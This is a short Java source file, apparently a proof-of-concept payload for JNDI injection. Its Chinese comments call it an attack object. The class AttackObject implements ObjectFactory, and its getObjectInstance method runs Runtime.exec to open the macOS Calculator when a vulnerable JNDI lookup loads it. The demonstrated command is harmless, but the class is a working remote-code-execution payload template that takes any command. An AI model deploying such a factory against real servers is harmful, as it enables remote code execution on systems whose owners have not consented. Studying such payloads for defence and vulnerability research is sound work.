import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

/**
 * 这是一个攻击对象
 *
 * @author bluegitter
 * @create
 *
 **/
public class AttackObject implements javax.naming.spi.ObjectFactory {

    @Override
    public Object getObjectInstance(
            Object obj, Name name, Context nameCtx,
            Hashtable<?, ?> environment ) throws Exception {

        System.out.println("执行攻击代码...");
        //这里打开计算器
        Process exec = Runtime.getRuntime().exec( "open /System/Applications/Calculator.app" );

        return null;
    }
}
